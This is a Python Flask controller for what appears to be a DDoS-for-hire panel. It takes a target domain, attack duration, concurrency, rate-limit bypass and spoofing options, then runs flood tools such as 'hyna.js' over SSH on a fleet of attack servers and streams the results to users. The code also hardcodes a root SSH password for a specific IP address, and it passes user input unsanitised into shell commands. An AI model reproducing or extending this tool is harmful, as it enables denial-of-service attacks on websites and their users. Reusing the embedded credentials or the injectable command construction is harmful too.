from flask import jsonify, request, current_app
from app.extensions import socketio
from app.models.attack_log import AttackLog
from app.models.team import Team
from app.models.user_log import UserLog
from app.models.user import User
from app.models.server import Server
import pytz
from datetime import datetime
from app.configs.blacklist import BLACKLISTED_DOMAINS, MAX_ATTACK_ATTEMPTS
from app.configs.whitelist import WHITELISTED_IPS
from app.models.attack_server_log import AttackServerLog
from cryptography.hazmat.primitives import serialization
from app.db import db
import paramiko
import threading
import json
import os
from app.utils.decrypt_payload import decrypt_payload

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
private_key_path = os.path.join(BASE_DIR, 'configs', 'private_key.pem')
vn_timezone = pytz.timezone('Asia/Ho_Chi_Minh') 

with open(private_key_path, 'rb') as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None
    )

class AttackController:
    # Add class variable to store active channels
    active_channels = {}  # Format: {attackLogId: {serverHostname: channel}}

    def _streamOutput(self, channel, socketId, attackLogId, serverHostname, app):
        with app.app_context():
            fullOutput = ""
            attackLog = AttackLog.query.get(attackLogId)
            domain = attackLog.domainName
            attack_time = attackLog.time
            createdAt = attackLog.createdAt
            serverLog = AttackServerLog(
                attackLogId=attackLogId,
                serverHostname=serverHostname,
                status='running'
            )
            db.session.add(serverLog)
            db.session.commit()

            while True:
                if channel.recv_ready():
                    output = channel.recv(4096).decode()
                    fullOutput += output
                    socketio.emit('log_message', {
                        'data': {
                            'domain': domain,
                            'attack_time': attack_time,
                            'attack': attackLogId,
                            'server': serverHostname
                        },
                        'status': 'success',
                        'message': 'attack data',
                    }, room=socketId)
                if channel.recv_stderr_ready():
                    errorOutput = channel.recv_stderr(4096).decode()
                    fullOutput += f"ERROR: {errorOutput}"
                    socketio.emit('log_message', {
                        'data': f"ERROR: {errorOutput}",
                        'server': serverHostname
                    }, room=socketId)
                if channel.exit_status_ready():
                    # Remove channel from active channels when complete
                    if attackLogId in self.active_channels and serverHostname in self.active_channels[attackLogId]:
                        del self.active_channels[attackLogId][serverHostname]
                        if not self.active_channels[attackLogId]:
                            del self.active_channels[attackLogId]
                    # Update server log with final output
                    serverLog.output = fullOutput
                    serverLog.status = 'completed'
                    db.session.commit()

                    # Check if all server logs are completed
                    allServerLogs = AttackServerLog.query.filter_by(attackLogId=attackLogId).all()
                    if all(log.status == 'completed' for log in allServerLogs):
                        attackLog = AttackLog.query.get(attackLogId)
                        if attackLog:
                            attackLog.status = 'completed'
                            db.session.commit()
                    break

    def _executeRemoteCommand(self, hostName, userName, passWord, command, socketId, attackLogId):
        try:
            sshClient = paramiko.SSHClient()
            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshClient.connect(hostName, username=userName, password=passWord)
            if command.find("hyna.js") != -1:
                sshClient.exec_command("pkill -9 xvfb-run; pkill -9 Xvfb")
            else:
                sshClient.exec_command("chmod +x *")

            transport = sshClient.get_transport()
            channel = transport.open_session()
            channel.get_pty()
            channel.exec_command(command)

            # Store channel reference
            if attackLogId not in self.active_channels:
                self.active_channels[attackLogId] = {}
            self.active_channels[attackLogId][hostName] = channel

            app = current_app._get_current_object()
            streamThread = threading.Thread(
                target=self._streamOutput, 
                args=(channel, socketId, attackLogId, hostName, app)
            )
            streamThread.daemon = True
            streamThread.start()
            
            return True, None
        except Exception as e:
            # Update server log status on error
            serverLog = AttackServerLog(
                attackLogId=attackLogId,
                serverHostname=hostName,
                status='failed',
                output=str(e)
            )
            db.session.add(serverLog)
            db.session.commit()
            return False, str(e)

    def _executeOnServers(self, attackCommand, socketId, attackLogId, serverList=None):
        # if not serverList:
        #     serverList = ATTACK_SERVERS

        successfulServers = []
        errors = []

        for server in serverList:
            # Generate command using server-specific node path
            command = f"{attackCommand}"
            
            print(f"Executing command on {server['ip']}: {command}")
            success, error = self._executeRemoteCommand(
                server['ip'],
                server['username'],
                server['password'],
                command,
                socketId,
                attackLogId
            )
            
            if success:
                successfulServers.append(server['ip'])
            else:
                errors.append(f"Server {server['ip']}: {error}")

        return successfulServers, errors

    def attack(self):

        clientIp = request.remote_addr
        if clientIp not in WHITELISTED_IPS:
            return jsonify({
                "status": "error",
                "message": "Access denied: Your IP is not whitelisted"
            }), 400

        currentUser = request.currentUser
        data = request.get_json()

        try:    
            payload = decrypt_payload(data, private_key)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400
        
        user = User.query.get(currentUser['id'])
        if not user.status:
            return jsonify({
                "status": "error",
                "message": "Your account has been deactivated"
            }), 400

        if user.attackCount >= MAX_ATTACK_ATTEMPTS:
            user.deactivate()
            return jsonify({
                "status": "error",
                "message": f"You have exceeded the maximum number of attacks ({MAX_ATTACK_ATTEMPTS}). Your account has been deactivated"
            }), 400
        
        socketId = data.get('sid', '')
        domainName = payload.get('domain')
        attackTimeValue = payload.get('attack_time')
        bypassRateLimitValue = str(payload.get('bypass_ratelimit')).lower()
        coreStrengthValue = payload.get('core_strength')
        modeValue = payload.get('mode')
        concurrentValue = payload.get('concurrents')
        requestCount = payload.get('request')
        spoof = payload.get('spoof', '')
        death_sword_http = payload.get('death_sword_http', '')
        death_sword_http = str(death_sword_http) if death_sword_http is not None else ""
        typeAttack = payload.get('typeAttack')

        # Check blacklisted domains
        for blacklisted in BLACKLISTED_DOMAINS:
            if blacklisted in domainName.lower():
                # Increment attack count first
                user.increment_attack_count()

                return jsonify({
                    "status": "error",
                    "message": f"Your attack on {domainName} has been blocked"
                }), 400

        # Get headers from request headers
        headers = dict(request.headers)
        # Remove default headers we don't want to store
        headers.pop('Host', None)
        headers.pop('Content-Length', None)
        headers.pop('Content-Type', None)
        headers.pop('User-Agent', None)
        headers.pop('Accept', None)
        headers.pop('Accept-Encoding', None)
        headers.pop('Connection', None)
        headers.pop('Authorization', None)

        if not domainName:
            return jsonify({
                "status": "error",
                "message": "Domain is required"
            }), 400
        servers_to_use = []
        
        if currentUser:
            # Check if user is admin
            isAdmin = currentUser.get('isAdmin', False)
            
            if isAdmin:
                # Admin case: Use servers selected by admin
                target_server_ids = payload.get('servers', [])
                if not target_server_ids:
                    return jsonify({
                        'status': 'error',
                        'message': 'SERVER REQUIRED'
                    }), 400
                    
                servers_to_use = []
                for id in target_server_ids:
                    server = Server.query.get(id)
                    if server is None:
                        return jsonify({
                            'status': 'error',
                            'message': 'One or more servers specified do not exist'
                        }), 400
                    servers_to_use.append({
                        'ip': server.ip,
                        'username': server.username,
                        'password': server.password
                    })
            else:
                user = User.query.get(currentUser.get('id'))
                if user:
                    user_server_id = user.server_id
                    
                    if user_server_id:
                        server = Server.query.get(user_server_id)
                        if server:
                            servers_to_use = [{
                                'ip': server.ip,
                                'username': server.username,
                                'password': server.password
                            }]
                        else:
                            return jsonify({
                                'status': 'error',
                                'message': 'SERVER NOT FOUND'
                            }), 400
                    else:
                        return jsonify({
                            'status': 'error',
                            'message': "YOU DON'T HAVE A SERVER"
                        }), 400
                else:
                    return jsonify({
                        'status': 'error',
                        'message': 'USER NOT FOUND'
                    }), 404

        if modeValue == 'xvfb-run /root/.nvm/versions/node/v20.18.3/bin/node hyna.js':
            attackCommand = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --debug true {bypassRateLimitValue}'
        else:
            attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} {bypassRateLimitValue}'
        attackCommand = ' '.join(attackCommand.split())
        print(attackCommand)
        print(servers_to_use)
        attackLog = AttackLog(
            userId=currentUser['id'],
            domainName=domainName,  
            time=int(attackTimeValue),
            concurrent=int(concurrentValue),
            request=int(requestCount),
            command=attackCommand,
            headers=json.dumps(headers) if headers else None
        )
        db.session.add(attackLog)
        db.session.commit()
        # Execute command on all specified servers with parameters instead of command
        successfulServers, errors = self._executeOnServers(
            attackCommand,
            socketId,
            attackLog.id,
            servers_to_use
        )
        server_ips = [server['ip'] for server in servers_to_use]
        if not successfulServers:
            return jsonify({
                "status": "error",
                "message": f"Attack failed on all servers. Errors: {', '.join(errors)}"
            }), 500
        
        if not user.isAdmin:
            log_entry = UserLog(
                ip=clientIp,
                name_account=user.nameAccount,
                detail=f'Attack domain: {domainName} concurrent: {concurrentValue} server: {server_ips}',
                time_active=datetime.now(vn_timezone)
            )
            db.session.add(log_entry)
            db.session.commit()

        return jsonify({
            "status": "success",
            "data": {
                "attack": attackLog.id,
            },
            "message": 'Attack success'
        })

    def terminate_attack(self, logId: int):
        currentUser = request.currentUser
        attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not attackLog:
            return jsonify({
                "status": "error",
                "message": "Attack log not found"
            }), 404

        if logId not in self.active_channels:
            return jsonify({
                "status": "error",
                "message": "No active channels found for this attack"
            }), 404

        terminated_servers = []
        for serverHostname, channel in self.active_channels[logId].items():
            try:
                channel.close()
                serverLog = AttackServerLog.query.filter_by(
                    attackLogId=logId,
                    serverHostname=serverHostname
                ).first()
                if serverLog:
                    serverLog.status = 'terminated'
                    db.session.commit()
                terminated_servers.append(serverHostname)
            except Exception as e:
                current_app.logger.error(f"Error terminating channel for server {serverHostname}: {str(e)}")

        # Update attack log status
        attackLog.status = 'terminated'
        db.session.commit()

        # Clean up active_channels
        del self.active_channels[logId]

        return jsonify({
            "status": "success",
            "message": "Attack terminated successfully",
            "terminatedServers": terminated_servers
        }), 200

    def terminate_server_attack(self, logId: int, serverHostname: str):
        currentUser = request.currentUser
        attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()

        if not attackLog:
            return jsonify({
                "status": "error",
                "message": "Attack log not found"
            }), 404
        if logId not in self.active_channels or serverHostname not in self.active_channels[logId]:
            return jsonify({
                "status": "error",
                "message": f"No active channel found for server {serverHostname}"
            }), 404

        try:
            # Close the specific channel
            channel = self.active_channels[logId][serverHostname]
            channel.close()

            # Update server log status
            serverLog = AttackServerLog.query.filter_by(
                attackLogId=logId,
                serverHostname=serverHostname
            ).first()
            if serverLog:
                serverLog.status = 'terminated'
                db.session.commit()

            # Remove channel from active_channels
            del self.active_channels[logId][serverHostname]
            if not self.active_channels[logId]:
                del self.active_channels[logId]
                # If no more active channels, update attack log status
                attackLog.status = 'terminated'
                db.session.commit()

            return jsonify({
                "status": "success",
                "message": f"Attack terminated successfully for server {serverHostname}"
            }), 200

        except Exception as e:
            current_app.logger.error(f"Error terminating channel for server {serverHostname}: {str(e)}")
            return jsonify({
                "status": "error",
                "message": f"Error terminating channel: {str(e)}"
            }), 500

    def getLogs(self):
        currentUser = request.currentUser
        limit = int(request.args.get('limit', 10))
        page = int(request.args.get('page', 1))
        skip = (page - 1) * limit

        # Modified query to include server logs
        query = AttackLog.query.filter_by(userId=currentUser['id'])
        logs = query.order_by(AttackLog.createdAt.desc()).limit(limit).offset(skip).all()
        total = query.count()

        # Fetch server logs for each attack log
        logsWithServerData = []
        for log in logs:
            logDict = log.toDict()
            serverLogs = AttackServerLog.query.filter_by(attackLogId=log.id).all()
            logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]
            logsWithServerData.append(logDict)

        return jsonify({
            'data': logsWithServerData,
            'meta': {
                'total': total,
                'totalPages': -(-total // limit),
                'currentPage': page,
                'pageSize': limit
            }
        }), 200

    def getLog(self, logId: int):
        currentUser = request.currentUser
        log = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not log:
            return jsonify({
                "status": "error",
                "message": "Log not found"
            }), 404

        # Include server logs in the response
        serverLogs = AttackServerLog.query.filter_by(attackLogId=logId).all()
        logDict = log.toDict()
        logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]

        return jsonify({
            "status": "success",
            "data": logDict
        }), 200

    def start_process(self):
        try:
            payload = request.get_json()
            domainName = payload.get('domain')
            attackTimeValue = payload.get('attack_time')
            bypassRateLimitValue = str(payload.get('bypass_ratelimit')).lower()
            coreStrengthValue = payload.get('core_strength')
            modeValue = payload.get('mode')
            concurrentValue = payload.get('concurrents')
            requestCount = payload.get('request')
            spoof = payload.get('spoof', '')
            death_sword_http = payload.get('death_sword_http', '')
            death_sword_http = str(death_sword_http) if death_sword_http is not None else ""
            typeAttack = payload.get('typeAttack')

            command = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --debug true --ratelimit {bypassRateLimitValue}'

            sshClient = paramiko.SSHClient()
            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshClient.connect("23.229.7.14", username="root", password="bsXhIWtZLSRGc5yY")

            stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[x]vfb'")
            process_list = stdout.read().decode().strip().split("\n")

            sshClient.exec_command("pkill -9 xvfb-run; pkill -9 Xvfb")
            sshClient.exec_command(command)
            sshClient.close()

            return jsonify({ "status": "success" }), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400

    def list_processes(self):
        try:
            sshClient = paramiko.SSHClient()
            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshClient.connect("23.229.7.14", username="root", password="bsXhIWtZLSRGc5yY")
            
            stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[h]yna.js' | grep -v 'xvfb'")
            raw_process_list = stdout.read().decode().strip().split("\n")
            sshClient.close()

            process_list = []
            for process in raw_process_list:
                parts = process.split(maxsplit=15)
                if len(parts) < 11:
                    continue

                process_info = {
                    "origin_data": process,
                    "domain": parts[12],
                    "attack_time": parts[8],
                    "remaining_time": parts[9],
                    "concurrents": int(parts[14]),
                    "pid": int(parts[1])
                }
                process_list.append(process_info)

            return jsonify({"status": "success", "data": process_list}), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400

    def stop_process(self, pid):
        try:
            if not isinstance(pid, int) or pid <= 0:
                return jsonify({"error": "Invalid PID"}), 400

            sshClient = paramiko.SSHClient()
            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshClient.connect("23.229.7.14", username="root", password="bsXhIWtZLSRGc5yY")
            
            command = f"kill -9 {pid}"
            sshClient.exec_command(command)

            stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[h]yna.js' | grep -v 'xvfb'")
            raw_process_list = stdout.read().decode().strip().split("\n")

            process_list = []
            for process in raw_process_list:
                parts = process.split(maxsplit=15)
                if len(parts) < 11:
                    continue

                process_info = {
                    "origin_data": process,
                    "domain": parts[12],
                    "attack_time": parts[8],
                    "remaining_time": parts[9],
                    "concurrents": int(parts[14]),
                    "pid": int(parts[1])
                }
                process_list.append(process_info)

            sshClient.close()

            return jsonify({"status": "success", "data": process_list}), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400
